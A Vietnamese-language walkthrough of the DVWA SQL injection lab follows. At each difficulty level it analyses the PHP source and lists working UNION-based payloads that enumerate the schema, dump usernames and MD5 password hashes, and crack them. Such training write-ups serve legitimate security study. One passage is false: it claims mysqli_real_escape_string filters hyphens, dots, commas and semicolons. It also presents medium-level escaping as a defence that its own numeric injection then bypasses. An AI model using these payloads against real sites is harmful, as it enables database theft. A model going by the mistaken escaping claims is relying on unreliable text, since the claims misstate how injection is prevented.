# SQL Injection (DVWA)

## Đề bài

![image](https://hackmd.io/_uploads/S1lbVxglC.png)

- có 5 user trong database có id từ 1-5 và chúng ta cần đánh cắp mật khẩu của họ thông qua lỗi SQLi

## LOW LEVEL

### Phân tích

- đọc source code mình được

```php
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    switch ($_DVWA['SQLI_DB']) {
        case MYSQL:
            // Check database
            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

            // Get results
            while( $row = mysqli_fetch_assoc( $result ) ) {
                // Get values
                $first = $row["first_name"];
                $last  = $row["last_name"];

                // Feedback for end user
                echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
            }

            mysqli_close($GLOBALS["___mysqli_ston"]);
            break;
        case SQLITE:
            global $sqlite_db_connection;

            #$sqlite_db_connection = new SQLite3($_DVWA['SQLITE_DB']);
            #$sqlite_db_connection->enableExceptions(true);

            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
            #print $query;
            try {
                $results = $sqlite_db_connection->query($query);
            } catch (Exception $e) {
                echo 'Caught exception: ' . $e->getMessage();
                exit();
            }

            if ($results) {
                while ($row = $results->fetchArray()) {
                    // Get values
                    $first = $row["first_name"];
                    $last  = $row["last_name"];

                    // Feedback for end user
                    echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
                }
            } else {
                echo "Error in fetch ".$sqlite_db->lastErrorMsg();
            }
            break;
    }
}

?>
```

đoạn code trên sẽ:

- Kiểm tra xem nút "Submit" đã được nhấn hay chưa thông qua biến $\_REQUEST['Submit'].
- Nếu nút "Submit" đã được nhấn, mã sẽ lấy giá trị của biến 'id' từ yêu cầu ($\_REQUEST['id']).
- Dựa vào giá trị của hằng số $\_DVWA['SQLI_DB'], mã chuyển sang một trong hai loại cơ sở dữ liệu: MySQL hoặc SQLite.
- Nếu cơ sở dữ liệu là MySQL (case MYSQL), mã sẽ thực hiện một truy vấn SQL để lấy thông tin người dùng từ bảng 'users', sau đó hiển thị kết quả.
- Nếu cơ sở dữ liệu là SQLite (case SQLITE), mã sẽ thực hiện một truy vấn SQL tương tự như trên, nhưng với cú pháp phù hợp cho SQLite.
- Kết quả được trả về từ cơ sở dữ liệu được lặp qua và thông tin về mỗi người dùng (tên và họ) được hiển thị trên trang.

câu lệnh SQL sử dụng dữ liệu thô do người dùng nhập vào để thực thi trong database

```php
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

vậy mình sẽ có thể bypass và chèn câu lệnh sql vào ô input để hệ thống thực hiện

### Khai thác

- mình dùng lệnh sau để liệt kê ra các user trong database

```sql
admin' or "1"="1";  #
```

- và như chúng ta đã phân tích câu lệnh mà chúng ta chèn vào đã được hệ thống thực hiện và liệt kê ra tất cả các user trong database

![image](https://hackmd.io/_uploads/HkCzdexlA.png)

- mình kiểm tra số cột trong table chứa user này với lệnh UNION thấy câu lệnh `' UNION SELECT NULL,NULL -- -` thực thi không có thông báo lỗi

![image](https://hackmd.io/_uploads/HJe4oexgA.png)

- vậy table này có 2 cột tiếp theo mình kiểm tra kiểu dữ liệu của các cột này xem cột nào hiển thị chuỗi với lệnh

```sql
' UNION SELECT "column1","column2" -- -
```

và thấy cả 2 cột đều hiển thị được dữ liệu string

![image](https://hackmd.io/_uploads/SJJlhexxR.png)

- tiếp theo mình kiểm tra thông tin phiên bản của database với lệnh

```sql
' UNION SELECT "column1",version() -- -
```

- và mình được phiên bản hiện tại của database là **10.4.28-MariaDB**

![image](https://hackmd.io/_uploads/SJqNk-lg0.png)

- tiếp theo mình tìm tên của CSDL với lệnh

```sql
' UNION SELECT "column1",database() -- -
```

- và được **dvwa**

![image](https://hackmd.io/_uploads/Hk9gx-geR.png)

- tiếp theo mình tìm các tables trong database này với lệnh

```sql
' UNION SELECT "column1", table_name  from information_schema.tables-- -
```

- chúng ta thấy có rất nhiều table trong đó có 2 table **users** và **guestbook**

![image](https://hackmd.io/_uploads/BJxlGWllA.png)

- tiếp theo mình sẽ tìm các cột trong table users này xem có cột password của chúng ta cần tìm không với lệnh

```sql
' UNION SELECT "column1", column_name  from information_schema.columns WHERE table_name = 'users' -- -
```

- và mình thấy được cột password trong table này

![image](https://hackmd.io/_uploads/H1v_XbxxR.png)

- tiếp theo mình sẽ liệt kê tất cả các user và password của họ ra với câu lệnh

```sql
' UNION SELECT user, password from users-- -
```

- và mình được mã hóa mật khẩu của 5 users có thông database

![image](https://hackmd.io/_uploads/B1UVNWgx0.png)

user giống trong CSDL

![image](https://hackmd.io/_uploads/Sy0NNmxg0.png)

- mình đem mật khẩu đi crack trên crackstation (https://crackstation.net/) và được mật khẩu của các user

- mình crack mật khẩu của admin được **password**

![image](https://hackmd.io/_uploads/rJezbHbegA.png)

và mình được mật khẩu của các user như bảng sau:

| user    | password in database             | password crack |
| ------- | -------------------------------- | -------------- |
| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 | password       |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123         |
| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b | charley        |
| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein        |
| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 | password       |

## MEDIUM LEVEL

### Phân tích

- chúng ta thấy giao diện chỉ cho chúng ta chọn những giá trị đã xác định từ 1-5 nhưng chúng ta có thể dễ dàng bypass bởi burp suit

![image](https://hackmd.io/_uploads/BJLAUmgeA.png)

![image](https://hackmd.io/_uploads/ByBkdQel0.png)

- đọc source code mình được

```php
<?php

if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $id = $_POST[ 'id' ];

    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

    switch ($_DVWA['SQLI_DB']) {
        case MYSQL:
            $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
            $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );

            // Get results
            while( $row = mysqli_fetch_assoc( $result ) ) {
                // Display values
                $first = $row["first_name"];
                $last  = $row["last_name"];

                // Feedback for end user
                echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
            }
            break;
        case SQLITE:
            global $sqlite_db_connection;

            $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
            #print $query;
            try {
                $results = $sqlite_db_connection->query($query);
            } catch (Exception $e) {
                echo 'Caught exception: ' . $e->getMessage();
                exit();
            }

            if ($results) {
                while ($row = $results->fetchArray()) {
                    // Get values
                    $first = $row["first_name"];
                    $last  = $row["last_name"];

                    // Feedback for end user
                    echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
                }
            } else {
                echo "Error in fetch ".$sqlite_db->lastErrorMsg();
            }
            break;
    }
}

// This is used later on in the index.php page
// Setting it here so we can close the database connection in here like in the rest of the source scripts
$query  = "SELECT COUNT(*) FROM users;";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
$number_of_rows = mysqli_fetch_row( $result )[0];

mysqli_close($GLOBALS["___mysqli_ston"]);
?>
```

Đoạn mã PHP này tương tự như đoạn mã trước đó, nhưng đã được cải thiện về mặt bảo mật bằng cách sử dụng hàm mysqli_real_escape_string để ngăn chặn tấn công SQL Injection.

| Đặc điểm       | mysqli_real_escape_string                                                                                                           | mysqli_query                                                                                                                                                 |
| -------------- | ----------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Mục đích       | Loại bỏ hoặc chuẩn hóa các ký tự đặc biệt trong chuỗi trước khi sử dụng trong một truy vấn SQL để ngăn chặn tấn công SQL Injection. | Thực thi một truy vấn SQL đến cơ sở dữ liệu MySQL và trả về kết quả (nếu có).                                                                                |
| Loại dữ liệu   | Chuỗi                                                                                                                               | Chuỗi SQL                                                                                                                                                    |
| Tham số        | - Một kết nối MySQL (hợp lệ)                                                                                                        | - Một kết nối MySQL (hợp lệ) <br> - Truy vấn SQL đã được chuẩn bị                                                                                            |
| Đối số         | - Kết nối MySQL được sử dụng để thực hiện truy vấn. <br> - Chuỗi cần xử lý.                                                         | - Kết nối MySQL được sử dụng để thực hiện truy vấn. <br> - Truy vấn SQL cần thực thi.                                                                        |
| Kết quả trả về | Chuỗi đã được xử lý sẵn để sử dụng trong truy vấn SQL.                                                                              | Kết quả của truy vấn SQL đã thực thi (ví dụ: một tập hợp kết quả nếu truy vấn SELECT được thực thi thành công, hoặc TRUE nếu truy vấn không trả về dữ liệu). |
| Ứng dụng       | Sử dụng khi cần bảo vệ truy vấn SQL khỏi SQL Injection bằng cách làm sạch dữ liệu đầu vào.                                          | Sử dụng khi cần thực thi các truy vấn SQL đến cơ sở dữ liệu MySQL.                                                                                           |
| Bảo mật        | Đảm bảo an toàn cho các truy vấn SQL bằng cách ngăn chặn tấn công SQL Injection.                                                    | Cần phải chú ý để tránh tấn công SQL Injection bằng cách sử dụng các biện pháp bảo mật như thủ tục tham số hóa truy vấn SQL.                                 |

Các ký tự đặc biệt được lọc bởi mysqli_real_escape_string bao gồm:

1. Dấu gạch chéo (\)
2. Dấu nháy đơn (')
3. Dấu nháy kép (")
4. Dấu gạch nối (-)
5. Dấu chấm (.)
6. Dấu phẩy (,)
7. Dấu chấm phẩy (;)
8. Các ký tự điều khiển như dấu xuống dòng, tab, vv.

Khi một chuỗi được truyền vào mysqli_real_escape_string, nó sẽ xử lý và trả về một chuỗi mới với các ký tự đặc biệt đã được thay thế bằng một phiên bản an toàn hơn (thường là một dấu gạch chéo `\` kèm theo ký tự đặc biệt). Điều này giúp ngăn chặn các cuộc tấn công SQL Injection bằng cách đảm bảo rằng các ký tự đặc biệt không được hiểu là phần của truy vấn SQL.

đoạn code trên sẽ:

- Kiểm tra xem nút "Submit" đã được nhấn hay chưa thông qua biến $\_POST['Submit'].
- Nếu nút "Submit" đã được nhấn, mã sẽ lấy giá trị của biến 'id' từ yêu cầu ($\_POST['id']) và sử dụng hàm mysqli_real_escape_string để chuẩn hóa giá trị này trước khi sử dụng trong truy vấn SQL.
- Dựa vào giá trị của hằng số `$_DVWA['SQLI_DB']`, mã chuyển sang một trong hai loại cơ sở dữ liệu: MySQL hoặc SQLite.
- Nếu cơ sở dữ liệu là MySQL (case MYSQL), mã sẽ thực hiện một truy vấn SQL để lấy thông tin người dùng từ bảng 'users', sau đó hiển thị kết quả.
- Nếu cơ sở dữ liệu là SQLite (case SQLITE), mã sẽ thực hiện một truy vấn SQL tương tự như trên, nhưng với cú pháp phù hợp cho SQLite.
- Sau khi lấy thông tin người dùng, mã hiển thị nó trên trang web.
- Cuối cùng, mã thực hiện một truy vấn SQL khác để đếm số lượng dòng trong bảng 'users'. Sau đó, nó đóng kết nối đến cơ sở dữ liệu MySQL sử dụng hàm mysqli_close.

### Khai thác

- tương tự low level khi đã biết bảng chứa mật khẩu mình dùng câu lệnh sau để chèn vào câu truy vấn sql

```sql
1 UNION SELECT user, password from users-- -
```

và được kết quả hàm băm mật khẩu như low level

![image](https://hackmd.io/_uploads/Hya7_mlx0.png)

## HiGH LEVEL

### Phân tích

![image](https://hackmd.io/_uploads/S1TmnQelC.png)

![image](https://hackmd.io/_uploads/Hk5wa7llR.png)

- đọc source code mình được

```php
<?php

if( isset( $_SESSION [ 'id' ] ) ) {
    // Get input
    $id = $_SESSION[ 'id' ];

    switch ($_DVWA['SQLI_DB']) {
        case MYSQL:
            // Check database
            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
            $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );

            // Get results
            while( $row = mysqli_fetch_assoc( $result ) ) {
                // Get values
                $first = $row["first_name"];
                $last  = $row["last_name"];

                // Feedback for end user
                echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
            }

            ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
            break;
        case SQLITE:
            global $sqlite_db_connection;

            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
            #print $query;
            try {
                $results = $sqlite_db_connection->query($query);
            } catch (Exception $e) {
                echo 'Caught exception: ' . $e->getMessage();
                exit();
            }

            if ($results) {
                while ($row = $results->fetchArray()) {
                    // Get values
                    $first = $row["first_name"];
                    $last  = $row["last_name"];

                    // Feedback for end user
                    echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
                }
            } else {
                echo "Error in fetch ".$sqlite_db->lastErrorMsg();
            }
            break;
    }
}

?>
```

đoạn code sẽ:

- Kiểm tra xem session ID có tồn tại không thông qua biến `$_SESSION['id']`. Nếu session ID tồn tại, mã sẽ tiếp tục, ngược lại sẽ không thực hiện bất kỳ hành động nào.
- Nếu session ID tồn tại, mã sẽ lấy giá trị session ID từ `$_SESSION['id']` và gán cho biến $id.
- Dựa vào giá trị của hằng số `$_DVWA['SQLI_DB']`, mã chuyển sang một trong hai loại cơ sở dữ liệu: MySQL hoặc SQLite.
- Nếu cơ sở dữ liệu là MySQL (case MYSQL), mã sẽ thực hiện một truy vấn SQL để lấy thông tin người dùng từ bảng 'users' với điều kiện là user_id = '$id', và chỉ lấy một bản ghi (LIMIT 1).
- Nếu cơ sở dữ liệu là SQLite (case SQLITE), mã sẽ thực hiện một truy vấn SQL tương tự như trên với cú pháp phù hợp cho SQLite.
- Kết quả của truy vấn sẽ được lặp qua (nếu có) và thông tin về người dùng (tên và họ) sẽ được hiển thị trên trang web thông qua lệnh echo.
- Cuối cùng, kết nối đến cơ sở dữ liệu sẽ được đóng lại (nếu là MySQL).

### Khai thác

- tiếp tục nhập câu lệnh `' UNION SELECT user, password from users-- -` vào phần SESSION ID mình được password của 5 user trong database

![image](https://hackmd.io/_uploads/ryysp7xl0.png)

## IMPOSSIBLE LEVEL

### Phân tích

![image](https://hackmd.io/_uploads/B1Dg1Vee0.png)

- đọc source code mình được

```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $id = $_GET[ 'id' ];

    // Was a number entered?
    if(is_numeric( $id )) {
        $id = intval ($id);
        switch ($_DVWA['SQLI_DB']) {
            case MYSQL:
                // Check the database
                $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
                $data->bindParam( ':id', $id, PDO::PARAM_INT );
                $data->execute();
                $row = $data->fetch();

                // Make sure only 1 result is returned
                if( $data->rowCount() == 1 ) {
                    // Get values
                    $first = $row[ 'first_name' ];
                    $last  = $row[ 'last_name' ];

                    // Feedback for end user
                    echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
                }
                break;
            case SQLITE:
                global $sqlite_db_connection;

                $stmt = $sqlite_db_connection->prepare('SELECT first_name, last_name FROM users WHERE user_id = :id LIMIT 1;' );
                $stmt->bindValue(':id',$id,SQLITE3_INTEGER);
                $result = $stmt->execute();
                $result->finalize();
                if ($result !== false) {
                    // There is no way to get the number of rows returned
                    // This checks the number of columns (not rows) just
                    // as a precaution, but it won't stop someone dumping
                    // multiple rows and viewing them one at a time.

                    $num_columns = $result->numColumns();
                    if ($num_columns == 2) {
                        $row = $result->fetchArray();

                        // Get values
                        $first = $row[ 'first_name' ];
                        $last  = $row[ 'last_name' ];

                        // Feedback for end user
                        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
                    }
                }

                break;
        }
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

đoạn code sẽ

- Kiểm tra xem nút "Submit" đã được nhấn hay chưa thông qua biến `$_GET['Submit']`.
- Sau khi nút "Submit" được nhấn, mã kiểm tra tính hợp lệ của token chống CSRF thông qua hàm checkToken. Hàm này so sánh token được gửi trong yêu cầu (`$_REQUEST['user_token']`) với token được lưu trữ trong session (`$_SESSION['session_token']`). Nếu token không hợp lệ, người dùng sẽ được chuyển hướng đến trang 'index.php'.
- Sau khi token chống CSRF được kiểm tra, mã sẽ lấy giá trị của biến 'id' từ yêu cầu (`$_GET['id']`) và kiểm tra xem nó có phải là một số hay không thông qua hàm is_numeric. Nếu 'id' là một số, nó sẽ được chuyển đổi thành kiểu integer bằng hàm intval.
- Dựa vào giá trị của hằng số `$_DVWA['SQLI_DB']`, mã chuyển sang một trong hai loại cơ sở dữ liệu: MySQL hoặc SQLite.
- Nếu cơ sở dữ liệu là MySQL (case MYSQL), mã sẽ thực hiện một truy vấn SQL để lấy thông tin người dùng từ bảng 'users' với điều kiện là user_id = (:id), sử dụng PDO để thực hiện truy vấn và tham số hóa giá trị của 'id' để ngăn chặn các cuộc tấn công SQL Injection.
- Nếu cơ sở dữ liệu là SQLite (case SQLITE), mã sẽ thực hiện một truy vấn SQL tương tự như trên với cú pháp phù hợp cho SQLite, cũng sử dụng tham số hóa giá trị của 'id'.
- Kết quả của truy vấn sẽ được lặp qua (nếu có) và thông tin về người dùng (tên và họ) sẽ được hiển thị trên trang web thông qua lệnh echo.
- Cuối cùng, mã sẽ tạo và lưu trữ một token chống CSRF mới trong session thông qua hàm generateSessionToken để sử dụng cho các yêu cầu tiếp theo.
- Đoạn mã này cung cấp một cách an toàn để truy xuất dữ liệu từ cơ sở dữ liệu bằng cách sử dụng tham số hóa truy vấn SQL và kiểm tra tính hợp lệ của token chống CSRF để ngăn chặn tấn công CSRF.

vậy chúng tâ nên dùng hàm mysqli_real_escape_string để validate đầu vào cùng với đó là dùng prepare để tham số hóa đầu vào và kết nối đến database

<img  src="https://3198551054-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FVvHHLY2mrxd5y4e2vVYL%2Fuploads%2FF8DJirSFlv1Un7WBmtvu%2Fcomplete.gif?alt=media&token=045fd197-4004-49f4-a8ed-ee28e197008f">
